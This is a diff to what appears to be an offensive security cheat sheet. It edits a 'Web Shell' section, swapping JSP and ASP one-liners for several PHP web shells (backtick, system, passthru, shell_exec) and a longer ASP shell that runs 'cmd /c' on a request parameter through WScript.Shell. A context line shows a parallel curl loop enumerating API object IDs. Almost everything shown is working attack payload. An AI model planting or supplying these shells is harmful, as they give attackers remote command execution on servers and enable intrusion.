@@ -136,10 +136,17 @@ cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H 
 
 [*] Web Shell
 +---------- One Liners ----------+
-JSP   <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
-PHP   <?php echo passthru($_GET['cmd']); ?>
+PHP   <?=`$_GET[0]`?>
+      <?php system($_GET['cmd']); ?>
+      <?php passthru($_GET['cmd']); ?>
+      <?php echo passthru($_GET['cmd']); ?>
       <?php echo shell_exec($_GET['cmd']); ?>
-ASP   <% eval request("cmd") %>
+
++---------- ASP ----------+
+<% Response.ContentType = "text/plain"
+Set s = CreateObject("WScript.Shell")
+Set c = s.Exec("cmd /c " & Request("cmd"))
+Response.Write c.StdOut.ReadAll() %>
 
 +---------- PHP ----------+
 <html>
